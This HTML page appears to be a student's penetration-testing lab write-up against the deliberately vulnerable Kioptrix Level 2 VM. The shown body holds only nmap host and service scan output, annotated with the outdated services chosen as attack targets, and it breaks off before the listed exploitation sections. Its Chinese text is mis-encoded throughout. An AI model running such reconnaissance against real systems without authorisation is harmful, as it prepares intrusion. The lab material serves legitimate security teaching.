
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../lab02/">
      
      
        <link rel="next" href="../lab04/">
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
    
    
      
        <title>Lab03 - CSNote</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.e53b48f4.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../stylesheets/extra.css">
    
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.css">
    
      <link rel="stylesheet" href="https://fonts.loli.net/css?family=JetBrains Mono:400,500,600,700&display=swap">
    
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.1.0/style.css">
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#lab03-writeup" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="CSNote" class="md-header__button md-logo" aria-label="CSNote" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            CSNote
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Lab03
            
          </span>
        </div>
      </div>
    </div>
    
      
    
    
    
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="CSNote" class="md-nav__button md-logo" aria-label="CSNote" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    CSNote
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    index
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    OI-learning
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            OI-learning
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OI-Learning/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    intro
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OI-Learning/C%2B%2B%20OOP/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    C++ é¢å‘å¯¹è±¡
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Algorithm
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            Algorithm
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OI-Learning/Algorithm/STL_algorithm/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    STL ç®—æ³•åº“ ref
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OI-Learning/Algorithm/fastpow/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    å¿«é€Ÿå¹‚
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
        
          
          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Data Structure
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4">
            <span class="md-nav__icon md-icon"></span>
            Data Structure
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OI-Learning/Data-Structure/linkedlist/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    é“¾è¡¨
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OI-Learning/Data-Structure/vector/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    STL vector ref
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OI-Learning/Data-Structure/stack/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    æ ˆ && å•è°ƒæ ˆ
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OI-Learning/Data-Structure/queue/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    é˜Ÿåˆ— && å•è°ƒé˜Ÿåˆ—
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OI-Learning/Data-Structure/hashmap/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    å“ˆå¸Œè¡¨
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Course Notes
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Course Notes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
        
          
          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    ICSPA x86 note
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1">
            <span class="md-nav__icon md-icon"></span>
            ICSPA x86 note
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ICSPA-x86/PA0/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PA0
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ICSPA-x86/PA1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PA1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ICSPA-x86/PA2-1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PA2-1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ICSPA-x86/i386/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    i386 æŒ‡ä»¤ç»“æ„ for PA2-1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ICSPA-x86/PA2-2/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PA2-2
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" checked>
        
          
          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    ç½‘ç»œæ”»é˜²å®æˆ˜ note
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3_2">
            <span class="md-nav__icon md-icon"></span>
            ç½‘ç»œæ”»é˜²å®æˆ˜ note
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../lab01/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Lab01
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../lab02/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Lab02
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Lab03
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Lab03
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    <span class="md-ellipsis">
      æ¸—é€ç›®çš„
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    <span class="md-ellipsis">
      å…·ä½“æ“ä½œ
    </span>
  </a>
  
    <nav class="md-nav" aria-label="å…·ä½“æ“ä½œ">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    <span class="md-ellipsis">
      ä¿¡æ¯æ”¶é›†
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getshell" class="md-nav__link">
    <span class="md-ellipsis">
      Getshell å°è¯•
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Getshell å°è¯•">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ipp-getshell" class="md-nav__link">
    <span class="md-ellipsis">
      ipp æ–¹å‘ï¼ˆGetShell å¤±è´¥ï¼‰
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#httpsql" class="md-nav__link">
    <span class="md-ellipsis">
      HTTP/SQL æ–¹å‘
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    <span class="md-ellipsis">
      ææƒå°è¯•
    </span>
  </a>
  
    <nav class="md-nav" aria-label="ææƒå°è¯•">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql-udf" class="md-nav__link">
    <span class="md-ellipsis">
      SQL UDF ææƒï¼ˆææƒå¤±è´¥ï¼‰
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kernal" class="md-nav__link">
    <span class="md-ellipsis">
      Kernal å†…æ ¸æ¼æ´
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    <span class="md-ellipsis">
      æ¸—é€ç»“æœ
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    <span class="md-ellipsis">
      é—®é¢˜åˆ†æ/å¯ç¤º
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    <span class="md-ellipsis">
      å…¶ä»–
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../lab04/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Lab04
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../lab05/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Lab05
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
        
          
          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    ICS && CSAPP Labs
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_3">
            <span class="md-nav__icon md-icon"></span>
            ICS && CSAPP Labs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ICS%26%26CSAPP-Lab/intro/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    intro
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ICS%26%26CSAPP-Lab/Datalab/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CSAPP Datalab
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ICS%26%26CSAPP-Lab/Bomblab/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CSAPP Bomblab
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ICS%26%26CSAPP-Lab/Binalab/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ICS Binalab
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Deep Learning
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Deep Learning
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Deep-Learning/intro/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    intro
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    <span class="md-ellipsis">
      æ¸—é€ç›®çš„
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    <span class="md-ellipsis">
      å…·ä½“æ“ä½œ
    </span>
  </a>
  
    <nav class="md-nav" aria-label="å…·ä½“æ“ä½œ">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    <span class="md-ellipsis">
      ä¿¡æ¯æ”¶é›†
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getshell" class="md-nav__link">
    <span class="md-ellipsis">
      Getshell å°è¯•
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Getshell å°è¯•">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ipp-getshell" class="md-nav__link">
    <span class="md-ellipsis">
      ipp æ–¹å‘ï¼ˆGetShell å¤±è´¥ï¼‰
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#httpsql" class="md-nav__link">
    <span class="md-ellipsis">
      HTTP/SQL æ–¹å‘
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    <span class="md-ellipsis">
      ææƒå°è¯•
    </span>
  </a>
  
    <nav class="md-nav" aria-label="ææƒå°è¯•">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql-udf" class="md-nav__link">
    <span class="md-ellipsis">
      SQL UDF ææƒï¼ˆææƒå¤±è´¥ï¼‰
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kernal" class="md-nav__link">
    <span class="md-ellipsis">
      Kernal å†…æ ¸æ¼æ´
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    <span class="md-ellipsis">
      æ¸—é€ç»“æœ
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    <span class="md-ellipsis">
      é—®é¢˜åˆ†æ/å¯ç¤º
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    <span class="md-ellipsis">
      å…¶ä»–
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



<h1 id="lab03-writeup">ç½‘ç»œæ”»é˜²å®æˆ˜ Lab03 Writeup</h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p>âœ 821 words  | ğŸ› 300 codelines  | â° 6 min read | Enjoy ğŸ¶</p>
</div>
<div class="admonition quote">
<p class="admonition-title">ä½¿ç”¨çš„é¶æœºä¸º VulnHub Kioptix Level 2</p>
</div>
<h2 id="_1">æ¸—é€ç›®çš„</h2>
<p>å–å¾—ç›®æ ‡é¶æœºçš„ root æƒé™</p>
<p>ç†Ÿæ‚‰ <code>nmap</code> ç­‰æŒ‡ä»¤çš„ç”¨æ³•ï¼Œäº†è§£ payload çš„æ„é€ ï¼Œç½‘ç»œæ¸—é€çš„åŸºæœ¬æµç¨‹</p>
<h2 id="_2">å…·ä½“æ“ä½œ</h2>
<h3 id="_3">ä¿¡æ¯æ”¶é›†</h3>
<p>å¯åŠ¨ VirtualBox ä¸­çš„ Kali æ”»å‡»æœºï¼ˆç”¨äºè¿›è¡Œæ¸—é€æ”»å‡»ï¼‰ä¸ Kioptix é¶æœºï¼Œç½‘ç»œé‡‡ç”¨ NAT è¿æ¥</p>
<p><code>ifconfig</code> è·å–æ”»å‡»æœºçš„ ip ä¸º <code>10.0.2.3</code>ï¼Œä½¿ç”¨ <code>nmap</code> æ‰«æ ipï¼š</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; nmap -sn 10.0.2.0/24
Starting Nmap 7.95 ( nmap.org ) at 2025-10-19 20:47 CST
Nmap scan report for bogon (10.0.2.1)
Host is up (0.0012s latency).
MAC Address: 52:55:0A:00:02:01 (Unknown)
Nmap scan report for bogon (10.0.2.2)
Host is up (0.00037s latency).
MAC Address: 08:00:27:12:13:F2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for bogon (10.0.2.15)
Host is up (0.0028s latency).
MAC Address: 08:00:27:EB:BA:50 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for bogon (10.0.2.3)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.12 seconds
</code></pre></div></td></tr></table></div>
<p>è€ƒè™‘é¶æœº ip ä¸º <code>10.0.2.15</code>ï¼Œç»§ç»­æ‰«æç«¯å£ <code>nmap -sV -sC 10.0.2.15</code>ï¼Œçœ‹çœ‹æœ‰å“ªäº›æœåŠ¡é¡¹</p>
<p>ä»¥ä¸‹æ˜¯å…³é”®çš„èŠ‚é€‰å†…å®¹ï¼Œæ¯ä¸ªæœåŠ¡éƒ½ä¼šæœ‰ç›¸åº”çš„æ³¨é‡Šè¯´æ˜</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span>
<span class="normal">42</span>
<span class="normal">43</span>
<span class="normal">44</span>
<span class="normal">45</span>
<span class="normal">46</span>
<span class="normal">47</span>
<span class="normal">48</span>
<span class="normal">49</span>
<span class="normal">50</span>
<span class="normal">51</span>
<span class="normal">52</span>
<span class="normal">53</span>
<span class="normal">54</span>
<span class="normal">55</span>
<span class="normal">56</span>
<span class="normal">57</span>
<span class="normal">58</span>
<span class="normal">59</span>
<span class="normal">60</span>
<span class="normal">61</span>
<span class="normal">62</span>
<span class="normal">63</span>
<span class="normal">64</span>
<span class="normal">65</span></pre></div></td><td class="code"><div><pre><span></span><code>// SSH æœåŠ¡ï¼Œæ”¯æŒ SSHv1
// OpenSSH 3.9p1 çš„å‘å¸ƒæ—¥æœŸä¸º 2004 å¹´ 8 æœˆï¼Œä¹Ÿéå¸¸å¤è€
// å¯èƒ½å­˜åœ¨æ¼æ´
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1

// HTTP æœåŠ¡ï¼Œä½¿ç”¨ Apache 2.0.52ï¼Œå…¶å‘å¸ƒæ—¥æœŸ 2004 å¹´ 9 æœˆï¼Œä¹Ÿéå¸¸å¤è€
// å¾…è¿›ä¸€æ­¥æœç´¢
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.0.52 (CentOS)

// RPC æœåŠ¡
// ç•™ä½œè§‚å¯Ÿ
PORT     STATE SERVICE  VERSION
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            810/udp   status
|_  100024  1            813/tcp   status

// SSL åŠ å¯†çš„ HTTPï¼Œå³ HTTPS
// è¿˜æ˜¯è€ƒè™‘ HTTP æ–¹å‘æŒ–æ˜
PORT     STATE SERVICE  VERSION
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
|_ssl-date: 2025-10-19T16:49:13+00:00; +4h00m04s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5

// Common UNIX Printing System æœåŠ¡ï¼Œä½¿ç”¨ IPP æ‰“å°åè®®
// å‘å¸ƒæ—¥æœŸ 2001 å¹´ 10 æœˆï¼Œè€ƒè™‘æ”»å‡»
// ä½†æ˜¯æ³¨æ„åˆ° http-title: 403 Forbiddenï¼Œä¸èƒ½ä¿è¯æ”»å‡»æˆåŠŸ
PORT     STATE SERVICE  VERSION
631/tcp  open  ipp      CUPS 1.1
|_http-title: 403 Forbidden
|_http-server-header: CUPS/1.1
| http-methods: 
|_  Potentially risky methods: PUT

